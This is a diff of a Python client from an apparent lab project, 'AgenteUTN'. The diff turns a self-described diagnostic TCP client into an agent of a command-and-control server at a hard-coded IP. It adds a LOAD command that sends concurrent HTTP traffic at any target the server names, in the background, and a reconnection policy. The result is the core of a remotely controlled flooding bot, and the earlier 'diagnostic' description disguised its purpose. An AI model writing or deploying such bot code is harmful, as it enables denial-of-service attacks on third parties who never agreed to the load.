@@ -1,18 +1,15 @@
 
 """
 AgenteUTN - aws_client.py
-Versión 1.7 - Cliente TCP de diagnóstico
+Versión 1.8 - Cliente TCP del laboratorio
 
 Funciones:
-- Conexión TCP a la VM de diagnóstico
-- Envío de HELLO
-- Envío periódico de HEARTBEAT
-- Recepción de PING
-- Envío de PONG con el ID original
+- Conexión TCP al servidor C2
+- Envío de HELLO y HEARTBEAT periódico
+- Respuesta a PING, INFO y ECHO
+- Carga HTTP controlada (LOAD) en segundo plano, cancelable con STOP
 - Manejo de ERROR y BYE
-- Cierre ordenado de conexión
-
-Solo admite PING como comando remoto.
+- Devuelve un código de salida para la política de reconexión
 """
 
 import asyncio
@@ -21,9 +18,9 @@ import contextlib
 from identity import build_hello, build_heartbeat
 from protocol import encode_message, decode_message
 from command_dispatcher import dispatch_command
+from load_command import run_load
 
-
-# Configuración del túnel SSH de diagnóstico
+# Configuración del servidor C2 del laboratorio
 HOST = "54.88.121.40"
 PORT = 8443
 
@@ -31,25 +28,28 @@ HEARTBEAT_INTERVAL = 10
 MAX_MESSAGE_SIZE = 65536
 CONNECT_TIMEOUT = 5
 
+# Códigos de salida de la sesión TCP
+EXIT_STOP = 0   # finalizar sin reconectar (stop, bye o error de autenticación)
+EXIT_RETRY = 1  # reconectar (conexión perdida o servidor ocupado)
 
-async def receive_messages(reader, writer):
-    """Recibe comandos de diagnóstico y responde con el mismo ID."""
 
+async def receive_messages(reader, writer, send_message, start_load, stop_load):
+    """Recibe mensajes del C2 y devuelve el código de salida de la sesión."""
     while True:
         try:
             raw = await reader.readline()
 
         except asyncio.LimitOverrunError:
             print("Mensaje demasiado grande.")
-            return
+            return EXIT_RETRY
 
         if not raw:
             print("El servidor cerró la conexión.")
-            return
+            return EXIT_RETRY
 
         if len(raw) > MAX_MESSAGE_SIZE:
             print("Mensaje demasiado grande.")
-            return
+            return EXIT_RETRY
 
         try:
             message = decode_message(raw)
@@ -60,48 +60,63 @@ async def receive_messages(reader, writer):
 
         message_type = message.get("type")
 
-        if (message_type == "command" and
-                message.get("name") in {"ping", "info"}):
-            try:
-                response = dispatch_command(message)
+        if message_type == "command":
+            name = message.get("name")
 
-            except (ValueError, KeyError) as error:
-                error_response = {
-                    "type": "result",
-                    "id": message.get("id"),
-                    "status": "error",
-                    "data": {"error": str(error)},
-                }
-                writer.write(encode_message(error_response))
-                await writer.drain()
+            if name == "load":
+                await start_load(message)
                 continue
 
-            writer.write(encode_message(response))
-            await writer.drain()
+            if name == "stop":
+                await stop_load()
+                try:
+                    response = dispatch_command(message)
+                except (ValueError, KeyError) as error:
+                    response = {
+                        "type": "result",
+                        "id": message.get("id"),
+                        "status": "error",
+                        "data": {"error": str(error)},
+                    }
+                await send_message(response)
+                print("Detenido por el servidor.")
+                return EXIT_STOP
 
-            print(
-                f"Comando recibido: {message['name']} "
-                f"({message['id']}) -> resultado enviado"
-            )
+            if name in ("ping", "info", "echo"):
+                try:
+                    response = dispatch_command(message)
+                except (ValueError, KeyError) as error:
+                    response = {
+                        "type": "result",
+                        "id": message.get("id"),
+                        "status": "error",
+                        "data": {"error": str(error)},
+                    }
+                await send_message(response)
+                print(
+                    f"Comando recibido: {name} "
+                    f"({message.get('id')}) -> resultado enviado"
+                )
+                continue
 
-        elif message_type == "command":
-            response = {
+            await send_message({
                 "type": "result",
                 "id": message.get("id"),
                 "status": "error",
                 "data": {"error": "Comando no permitido"},
-            }
-            writer.write(encode_message(response))
-            await writer.drain()
+            })
+            print(f"Comando rechazado: {name}")
 
         elif message_type == "bye":
+            await stop_load()
             print("El servidor solicitó la desconexión.")
-            return
+            return EXIT_STOP
 
         elif message_type == "error":
             code = message.get("code", "desconocido")
+            await stop_load()
             print(f"Error del servidor: {code}")
-            return
+            return EXIT_RETRY if code == "busy" else EXIT_STOP
 
         else:
             print(
@@ -109,55 +124,125 @@ async def receive_messages(reader, writer):
             )
 
 
-async def send_heartbeats(writer):
+async def send_heartbeats(send_message):
     """Envía HEARTBEAT cada diez segundos."""
-
     while True:
         await asyncio.sleep(HEARTBEAT_INTERVAL)
 
-        writer.write(
-            encode_message(build_heartbeat())
-        )
-
-        await writer.drain()
+        await send_message(build_heartbeat())
 
         print("HEARTBEAT enviado.")
 
 
-async def connect_diagnostic(agent_id: str):
-    """Establece la sesión de diagnóstico TCP."""
-
-    print("\nConectando a la VM de diagnóstico...")
-    print(f"Destino: {HOST}:{PORT}")
+async def connect_diagnostic(
+    agent_id: str,
+    host: str = HOST,
+    port: int = PORT,
+) -> int:
+    """Establece la sesión con el C2 y devuelve el código de salida."""
+    print("\nConectando al servidor C2...")
+    print(f"Destino: {host}:{port}")
     print(f"Agente: {agent_id}")
     print("Presioná Ctrl+C para desconectar.")
 
     reader, writer = await asyncio.wait_for(
         asyncio.open_connection(
-            HOST,
-            PORT,
+            host,
+            port,
             limit=MAX_MESSAGE_SIZE,
         ),
         timeout=CONNECT_TIMEOUT,
     )
 
+    write_lock = asyncio.Lock()
+    load_task = None
+
+    async def send_message(message: dict) -> None:
+        async with write_lock:
+            writer.write(encode_message(message))
+            await writer.drain()
+
+    async def stop_load() -> None:
+        nonlocal load_task
+        if load_task is not None and not load_task.done():
+            load_task.cancel()
+            with contextlib.suppress(
+                asyncio.CancelledError,
+                Exception,
+            ):
+                await load_task
+        load_task = None
+
+    async def run_load_command(message: dict) -> None:
+        nonlocal load_task
+        command_id = message.get("id")
+        args = message.get("args") or {}
+        target = str(args.get("target", ""))
+        duration = args.get("duration", 30)
+        concurrency = args.get("concurrency", 20)
+        print(
+            f"Carga iniciada: {target} durante {duration}s "
+            f"con {concurrency} conexiones"
+        )
+        try:
+            data = await run_load(target, duration, concurrency)
+            reply = {
+                "type": "result",
+                "id": command_id,
+                "status": "ok",
+                "data": data,
+            }
+            print(
+                f"Carga finalizada: enviadas={data['sent']} "
+                f"errores={data['errors']} rps={data['rps']}"
+            )
+        except asyncio.CancelledError:
+            print("Carga cancelada.")
+            raise
+        except Exception as exc:
+            reply = {
+                "type": "result",
+                "id": command_id,
+                "status": "error",
+                "data": {"error": str(exc)},
+            }
+            print(f"Carga fallida: {exc}")
+        with contextlib.suppress(Exception):
+            await send_message(reply)
+        load_task = None
+
+    async def start_load(message: dict) -> None:
+        nonlocal load_task
+        if load_task is not None and not load_task.done():
+            await send_message({
+                "type": "result",
+                "id": message.get("id"),
+                "status": "error",
+                "data": {"error": "carga ya en curso"},
+            })
+            return
+        load_task = asyncio.create_task(run_load_command(message))
+
     receiver = None
     heartbeat = None
+    exit_code = EXIT_RETRY
 
     try:
-        writer.write(
-            encode_message(build_hello(agent_id))
-        )
-        await writer.drain()
-
+        await send_message(build_hello(agent_id))
         print("HELLO enviado.")
 
         receiver = asyncio.create_task(
-            receive_messages(reader, writer)
+            receive_messages(
+                reader,
+                writer,
+                send_message,
+                start_load,
+                stop_load,
+            )
         )
 
         heartbeat = asyncio.create_task(
-            send_heartbeats(writer)
+            send_heartbeats(send_message)
         )
 
         done, pending = await asyncio.wait(
@@ -165,28 +250,35 @@ async def connect_diagnostic(agent_id: str):
             return_when=asyncio.FIRST_COMPLETED,
         )
 
+        if receiver in done:
+            exit_code = receiver.result()
+
         for task in pending:
             task.cancel()
 
         for task in pending:
             with contextlib.suppress(
-                asyncio.CancelledError
+                asyncio.CancelledError,
+                Exception,
             ):
                 await task
 
-        for task in done:
-            task.result()
-
     finally:
+        await stop_load()
+
         for task in (receiver, heartbeat):
             if task is not None and not task.done():
                 task.cancel()
                 with contextlib.suppress(
-                    asyncio.CancelledError
+                    asyncio.CancelledError,
+                    Exception,
                 ):
                     await task
 
         writer.close()
-        await writer.wait_closed()
+        with contextlib.suppress(Exception):
+            await writer.wait_closed()
 
         print("Conexión finalizada.")
+
+    return exit_code
